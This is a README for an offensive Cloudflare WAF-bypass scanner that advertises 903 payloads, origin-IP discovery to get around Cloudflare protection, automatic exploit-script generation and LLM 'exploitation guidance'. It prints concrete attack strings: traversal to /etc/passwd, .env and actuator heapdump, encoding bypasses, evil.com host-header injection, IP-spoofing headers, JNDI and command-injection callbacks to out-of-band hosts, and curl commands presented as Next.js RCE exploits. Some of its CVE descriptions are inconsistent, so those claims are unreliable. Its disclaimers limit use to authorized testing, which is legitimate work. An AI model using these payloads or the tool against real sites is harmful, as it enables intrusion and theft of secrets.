# Cloudflare ACME Challenge WAF Bypass Scanner

## 🆕 Update v2.2 (January 2026)

### New Features:
- 🎯 **SPA False Positive Detection** - Automatically detects React/Vue/Angular SPA catch-all routing and filters false positives
- ✨ **Modular Payloads Architecture** - 900+ payloads split into 13 separate files
- 🚀 **Next.js RSC RCE** - CVE-2024-34351, CVE-2025-55182, CVE-2025-66478 with 150+ payloads
- 🔄 **Improved OAST** - Better Out-of-band testing with multiple Interactsh servers
- 🎯 **Enhanced Origin IP Discovery** - DNS history via hackertarget.com API
- 🧠 **Multi-LLM Support** - OpenAI, Anthropic, Ollama, Groq, Gemini
- 📝 **Auto POC Generation** - Python, Bash, Nuclei, Burp Suite templates
- ⚡ **Comprehensive WAF Bypass** - URL encoding, Unicode, null bytes, case manipulation
- 🛡️ **Rate Limit Bypass Testing** - 100+ header variations for IP spoofing

### v2.2 Changes:
- **SPA Detection**: Scanner now detects Single Page Applications (React, Vue, Angular) that use catch-all routing
- **False Positive Filtering**: Automatically filters out SPA index.html responses that would otherwise be reported as vulnerabilities
- **Accurate Results**: Prevents reporting non-existent sensitive files (`/admin`, `/.env`, `/config.php`, etc.) as critical findings when they just return the SPA shell

### Code Structure:
```
├── scanner.py              # Entry point (CLI)
├── core/
│   ├── scanner.py          # CloudflareScanner class
│   ├── oast.py             # OAST client & server
│   ├── poc_generator.py    # Auto POC generation
│   └── llm_analyzer.py     # AI vulnerability analysis
└── utils/
    ├── config.py           # Configuration loader
    ├── constants.py        # Banner, user agents
    ├── payloads.py         # Backward compatibility wrapper
    └── payloads/           # 🆕 Modular payload structure
        ├── __init__.py     # Module exports
        ├── acme.py         # ACME challenge payloads (3)
        ├── actuator.py     # Spring Boot Actuator (47)
        ├── cloudflare.py   # CF-specific bypass (55)
        ├── graphql.py      # GraphQL introspection (30)
        ├── headers.py      # WAF bypass headers (132)
        ├── injection.py    # XSS, SQLi, SSTI, CMD (228)
        ├── log4shell.py    # Log4Shell/JNDI (43)
        ├── nextjs.py       # Next.js RSC RCE (163)
        ├── sensitive_paths.py # Admin panels (61)
        ├── ssrf.py         # SSRF payloads (70)
        ├── templates.py    # POC templates
        ├── traversal.py    # Path traversal/LFI (53)
        └── xxe.py          # XXE payloads (18)
```

---

## 📖 Research Reference
Based on **FearsOff Research**: [Cloudflare Zero-day: Accessing Any Host Globally](https://fearsoff.org/research/cloudflare-acme)

**Vulnerability**: Requests to `/.well-known/acme-challenge/{token}` were evaluated on a different code path - an implicit exception that executed **before** customer WAF blocking rules.

**Status**: Fixed by Cloudflare on October 27, 2025

## ⚠️ Disclaimer
This tool is created **ONLY** for:
- Authorized penetration testing
- Security research
- Bug bounty programs with written permission
- Educational purposes

**PROHIBITED** to use this tool for illegal activities or without authorization!

## 📋 Description
**Comprehensive** Cloudflare vulnerability scanner testing multiple attack vectors.

**Techniques used**:
1. **ACME WAF Bypass** - Requests to `/.well-known/acme-challenge/{token}` bypass WAF rules
2. **Path Traversal** - `..;/` (servlet stacks), `../` (PHP), URL encoding variants
3. **Cache Poisoning** - X-Forwarded-Host, cache key manipulation
4. **Host Header Injection** - Host, X-Forwarded-Host, X-Host manipulation
5. **Rate Limit Bypass** - IP spoofing headers (X-Forwarded-For, CF-Connecting-IP, etc.)
6. **HTTP Request Smuggling** - CL.TE and TE.CL techniques
7. **Sensitive Path Exposure** - Admin panels, configs, debug endpoints via ACME path

## 🔍 Features

### Core Features
- ✅ Cloudflare protection detection
- ✅ WAF Bypass detection (origin vs CF response)
- ✅ **Origin IP discovery** (subdomains, MX, SPF, DNS history)
- ✅ Framework auto-detection (Spring, PHP, Next.js, Express, etc.)
- ✅ Token verification (confirms bypass is not false positive)
- ✅ Multi-threading & JSON output

### Vulnerability Tests
| Category | Payloads | Description |
|----------|----------|-------------|
| **ACME WAF Bypass** | 3 | Core bypass via /.well-known/acme-challenge/ |
| **Spring Actuator** | 47 | `..;/` traversal to actuator endpoints with WAF bypass |
| **PHP LFI** | 43 | Local File Inclusion via path traversal with encoding bypass |
| **Next.js SSR** | 9 | Server-side rendering data exposure |
| **Next.js RSC RCE** | 66 | CVE-2024-34351, CVE-2025-55182, CVE-2025-66478 |
| **Next.js RSC Headers** | 34 | Middleware bypass headers |
| **Next.js RSC POST** | 54 | POST payloads with various WAF bypass techniques |
| **Path Traversal** | 10 | Multiple encoding techniques |
| **CF WAF Bypass** | 55 | URL encoding, unicode, null bytes, case manipulation |
| **CF Specific Paths** | 16 | /cdn-cgi/, /.well-known/ paths |
| **Cache Poisoning** | 8 | X-Forwarded-Host, cache key manipulation |
| **Host Header Injection** | 11 | Multiple host header variations |
| **Rate Limit Bypass** | 16 | IP spoofing headers |
| **WAF Bypass Headers** | 102 | Comprehensive header manipulation |
| **Sensitive Paths** | 61 | Admin, configs, debug via ACME bypass |
| **GraphQL** | 30 | Introspection via ACME path with WAF bypass |
| **SSRF** | 70 | Server-side request forgery with encoding bypass |
| **XSS** | 55 | Cross-site scripting with WAF bypass |
| **SQLi** | 56 | SQL injection with encoding bypass |
| **XXE** | 18 | XML External Entity with encoding bypass |
| **SSTI** | 41 | Server-side template injection with bypass |
| **Command Injection** | 76 | OS command injection with bypass |
| **Log4Shell/JNDI** | 43 | Log4j vulnerability payloads with bypass |

**📊 Total: 903 Payloads** with comprehensive WAF bypass techniques

### Origin IP Discovery Methods
1. **Response Headers** - X-Served-By, X-Backend-Server, Via, etc.
2. **Response Body** - IP leak in error messages/debug info
3. **Subdomain Enumeration** - 31 common subdomains (direct, origin, mail, api, etc.)
4. **MX Records** - Mail servers often expose origin IP
5. **SPF Records** - ip4: directives in TXT records
6. **DNS History API** - hackertarget.com historical DNS
7. **Error Pages** - Trigger errors to leak IP

## 🛠️ Installation

```bash
# Clone repository
git clone https://github.com/nulsec/Cloudflare-ACME-WAF-Bypass-Scanner.git
cd Cloudflare-ACME-WAF-Bypass-Scanner

# Install dependencies
pip install -r requirements.txt
```

## 🚀 Usage

### Scan single target:
```bash
python scanner.py -u https://example.com
```

### Scan with custom token:
```bash
# Token can be obtained from Cloudflare SSL/TLS Custom Hostnames (pending validation)
python scanner.py -u https://example.com --token "yMnWOcR2yv0yW-...Jm5QksreNRDUmqKfKPTk"
```

### Scan from file list:
```bash
python scanner.py -l targets.txt -o results.json
```

### With full options:
```bash
python scanner.py -u https://example.com -t 5 -T 15 -d 1 -v -o results.json
```

## 📖 Parameters

| Parameter | Description | Default |
|-----------|-------------|---------|
| `-u, --url` | Single target URL | - |
| `-l, --list` | File containing target list | - |
| `-t, --threads` | Number of threads | 10 |
| `-T, --timeout` | Request timeout (seconds) | 10 |
| `-d, --delay` | Delay between requests (seconds) | 0 |
| `-o, --output` | Output file (JSON) | - |
| `-v, --verbose` | Verbose mode | False |
| `--token` | Custom ACME challenge token | Random |
| `--oast` | Enable OAST (Out-of-band) testing | False |
| `--oast-server` | Interactsh server to use | Random |
| `--oast-domain` | Custom callback domain | - |
| `--oast-wait` | Wait time for callbacks (seconds) | 30 |

## 🔬 OAST (Out-of-band Application Security Testing)

OAST enables detection of **blind vulnerabilities** that don't show immediate responses:

```bash
# Enable OAST with default Interactsh servers
python scanner.py -u https://target.com --oast

# Use specific Interactsh server
python scanner.py -u https://target.com --oast --oast-server interact.sh

# Use your own callback server
python scanner.py -u https://target.com --oast --oast-domain your-domain.com

# Start your own OAST callback server
python scanner.py --oast-server-mode --oast-port 8080

# Combine with other features
python scanner.py -l targets.txt --oast --analyze --poc
```

### OAST Vulnerability Types Detected:

| Type | Description | Payload Example |
|------|-------------|-----------------|
| **Blind SSRF** | Server makes request to callback | `?url=http://callback.oast.pro/` |
| **Blind XSS** | XSS payload triggers callback | `<script src=http://cb.oast.pro>` |
| **XXE OOB** | XML parser fetches external entity | `<!ENTITY xxe SYSTEM "http://cb.oast.pro">` |
| **Command Injection** | OS command triggers DNS/HTTP | `;nslookup callback.oast.pro` |
| **Log4Shell/JNDI** | Log4j vulnerability | `${jndi:ldap://callback.oast.pro/a}` |
| **SSTI OOB** | Template injection with callback | `{{...popen('nslookup cb.oast.pro')...}}` |

### How OAST Works:

```
┌──────────────┐      1. Send payload with callback URL      ┌──────────────┐
│   Scanner    │ ────────────────────────────────────────────▶│    Target    │
└──────────────┘                                              └──────────────┘
       ▲                                                             │
       │                                                             │
       │                    3. Report callback                       │ 2. If vulnerable,
       │                       received                              │    target contacts
       │                                                             │    callback server
       │                                                             ▼
       │         ┌──────────────────────────────────────────────────────────┐
       └─────────│  OAST Server (Interactsh / Your Server)                  │
                 │  - Receives HTTP callbacks                                │
                 │  - Receives DNS queries                                   │
                 │  - Records source IP, payload ID                          │
                 └──────────────────────────────────────────────────────────┘
```

## 🎯 Payload Examples

### 1. Spring Boot Actuator (..;/ traversal)
```
/.well-known/acme-challenge/{token}/..;/..;/..;/..;/actuator/env
/.well-known/acme-challenge/{token}/..;/..;/..;/..;/actuator/health
/.well-known/acme-challenge/{token}/..;/..;/..;/..;/actuator/heapdump
```

### 2. PHP LFI
```
/.well-known/acme-challenge/{token}/../../../../etc/passwd
/.well-known/acme-challenge/{token}/../../../../etc/hosts
```

### 3. Next.js / SSR
```
/.well-known/acme-challenge/{token}/../_next/data/
/.well-known/acme-challenge/{token}/..;/api/config
```

### 3.1 Next.js RSC RCE (CVE-2024-34351, CVE-2025-55182, CVE-2025-66478)
```bash
# CVE-2024-34351: Middleware bypass with x-middleware-subrequest header
curl -H "x-middleware-subrequest: 1" https://target.com/_next/server/app/
curl -H "x-middleware-subrequest: middleware" https://target.com/admin

# CVE-2025-55182: RSC Streaming Response RCE
curl -H "rsc: 1" -H "Accept: text/x-component" https://target.com/_rsc
curl -H "next-rsc-flight: 1" -H "rsc: 1" https://target.com/

# CVE-2025-66478: Server Actions Deserialization RCE
curl -X POST -H "Next-Action: test" -H "Content-Type: application/json" \
  -d '{"__proto__":{"admin":true}}' https://target.com/
curl -H "x-server-action: 1" -H "x-action-encrypted: false" https://target.com/

# Server Actions via ACME bypass
/.well-known/acme-challenge/{token}/../__next_action
/.well-known/acme-challenge/{token}/../_next/server/pages/api/
/.well-known/acme-challenge/{token}/../.next/server-reference-manifest.json

# RSC Flight data exposure
curl -H "rsc: 1" -H "Next-Action: true" https://target.com/

# Source map exposure
/.well-known/acme-challenge/{token}/../_next/static/chunks/main.js.map
```

### 4. WAF Bypass Encoding
```
/%2e%2e/%2e%2e/%2e%2e/etc/passwd
/%252e%252e/%252e%252e/etc/passwd (double encoding)
/..%c0%af../etc/passwd (unicode normalization)
/admin%00.js (null byte injection)
```

### 5. Cache Poisoning
```
X-Forwarded-Host: evil.com
X-Original-URL: /admin
X-Rewrite-URL: /admin
```

### 6. Host Header Injection
```
Host: evil.com
X-Forwarded-Host: evil.com
X-Host: evil.com
Forwarded: host=evil.com
```

### 7. Rate Limit Bypass
```
X-Forwarded-For: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
```

### 8. Sensitive Paths via ACME
```
/.well-known/acme-challenge/{token}/../.git/config
/.well-known/acme-challenge/{token}/../.env
/.well-known/acme-challenge/{token}/../admin
/.well-known/acme-challenge/{token}/../graphql?query={__schema{types{name}}}
```

## 🔎 Origin IP Discovery Methods

The scanner attempts to find the real origin IP through:
1. **Response Headers** - X-Served-By, X-Backend-Server, Via, etc.
2. **Response Body** - IPs leaked in content
3. **Subdomain Enumeration** - mail, ftp, cpanel, staging, dev, etc. (31 subdomains)
4. **MX Records** - Mail exchanger records
5. **SPF Records** - IPs in SPF TXT record
6. **DNS History API** - hackertarget.com free API
7. **Error Pages** - Trigger errors that may leak IP

## 🤖 Auto POC Generation

Generate exploit proof-of-concept files automatically:

```bash
# Generate POC files
python scanner.py -l targets.txt --poc

# Custom output directory
python scanner.py -l targets.txt --poc --poc-dir my_exploits
```

**Generated files:**
- `poc_<target>.py` - Python exploit script
- `poc_<target>.sh` - Curl/Bash script
- `nuclei_<target>.yaml` - Nuclei template
- `burp_<target>.txt` - Burp Suite requests

## 🧠 LLM Analysis

Analyze vulnerabilities with AI:

```bash
# OpenAI GPT-4
python scanner.py -l targets.txt --analyze --llm openai --api-key sk-xxx

# Anthropic Claude
python scanner.py -l targets.txt --analyze --llm anthropic --api-key sk-ant-xxx

# Local Ollama (free, no API key)
python scanner.py -l targets.txt --analyze --llm ollama --model llama3.2

# Groq (fast, free tier available)
python scanner.py -l targets.txt --analyze --llm groq

# Save analysis to file
python scanner.py -l targets.txt --analyze --llm openai --analysis-output report.md
```

**Supported LLM Providers:**
| Provider | Model (default) | API Key Env Var |
|----------|-----------------|-----------------|
| OpenAI | gpt-4o | `OPENAI_API_KEY` |
| Anthropic | claude-sonnet-4-20250514 | `ANTHROPIC_API_KEY` |
| Ollama | llama3.2 | Not required (local) |
| Groq | llama-3.3-70b-versatile | `GROQ_API_KEY` |
| Gemini | gemini-1.5-flash | `GEMINI_API_KEY` |

**LLM Analysis includes:**
- Risk Assessment (Critical/High/Medium/Low)
- Attack Chain analysis
- Impact Analysis  
- Step-by-step Exploitation Guide
- Remediation recommendations
- CVSS 3.1 Score estimation

## 📊 Output Example
```
[*] Scanning: https://target.com
  [CF Protected] Baseline Status: 403
  [!] WAF BYPASS DETECTED - Origin responding on ACME path!
  [*] Successful token: abc123...
  [!] CONFIRMED - Multiple tokens bypass WAF (vulnerability confirmed)
  [*] Detected Framework: spring
  [*] Attempting to find Origin IP...
  [*] Checking 31 subdomains for origin IP...
      [+] Found via DNS history: 1.2.3.4 (mail.target.com)
  [+] Potential Origin IP(s) Found:
      → 1.2.3.4 (Source: DNS History: mail.target.com)
  [*] Testing Spring Boot Actuator endpoints...
  [CRITICAL] https://target.com/.well-known/acme-challenge/xxx/..;/..;/..;/..;/actuator/env
    └── Sensitive data exposed!
  [*] Testing cache poisoning vectors...
  [*] Testing host header injection...
  [*] Testing rate limit bypass headers...
  [*] Testing sensitive paths via ACME bypass...

[*] Generating exploit POCs...
  [+] Generated: pocs/poc_target_com.py
  [+] Generated: pocs/poc_target_com.sh
  [+] Generated: pocs/nuclei_target_com.yaml
  [+] Generated: pocs/burp_target_com.txt

[*] Starting LLM analysis with openai...
=================================================================
  LLM ANALYSIS: https://target.com
=================================================================

## Risk Assessment: HIGH
...
```

## 🔬 How It Works

1. **Baseline Check**: Request to root path to get normal response (usually CF block page)
2. **WAF Bypass Test**: Request to `/.well-known/acme-challenge/{token}` - if response differs from baseline, WAF is bypassed
3. **Token Verification**: Test multiple random tokens to confirm vulnerability (not false positive)
4. **Framework Detection**: Identify framework from response (Spring, PHP, Next.js, etc.)
5. **Origin IP Discovery**: Attempt to find real server IP through various methods
6. **Vulnerability Scanning**: Test all vulnerability categories (Actuator, LFI, Cache, Host Header, etc.)
7. **Sensitive Path Enumeration**: Access admin/config paths via ACME path traversal
8. **POC Generation**: Auto-generate exploit scripts (Python, Bash, Nuclei, Burp)
9. **LLM Analysis**: AI-powered vulnerability analysis and exploitation guidance

## 📚 Timeline (from FearsOff)
- **October 9, 2025** - Submitted via HackerOne
- **October 13, 2025** - Vendor validation started
- **October 14, 2025** - Triaged by HackerOne
- **October 27, 2025** - Final fix deployed

## ⚡ Tips
1. Use `--token` with valid token from Cloudflare Custom Hostnames for more accurate results
2. Use delay (`-d 1`) to avoid rate limiting
3. Targets that are still vulnerable should have been patched (Oct 2025)
4. Use external tools for more origin IP discovery: SecurityTrails, Censys, Shodan

## 📜 Legal
Ensure you have written permission before performing security testing on any target. Use of this tool is entirely your responsibility.

## � Credits
- **FearsOff** - Original vulnerability research
- **ProjectDiscovery** - Interactsh OAST servers
- **hackertarget.com** - DNS history API

## �🔗 References
- [FearsOff Research](https://fearsoff.org/research/cloudflare-acme)
- [Cloudflare Blog](https://blog.cloudflare.com/acme-path-vulnerability/)
- [CVE-2024-34351 - Next.js Server Actions SSRF](https://nvd.nist.gov/vuln/detail/CVE-2024-34351)
- [CVE-2025-55182 - Next.js RSC Streaming RCE](https://nvd.nist.gov/vuln/detail/CVE-2025-55182)
- [CVE-2025-66478 - Next.js Server Actions Deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2025-66478)
- [Assetnote - Next.js and the Corrupt Middleware](https://assetnote.io/blog/nextjs-and-the-corrupt-middleware)
- [CVE-2024-46982 - Next.js Cache Poisoning](https://nvd.nist.gov/vuln/detail/CVE-2024-46982)

## 📝 License
MIT License - See LICENSE file for details

---
**Made with ❤️ for Security Researchers**
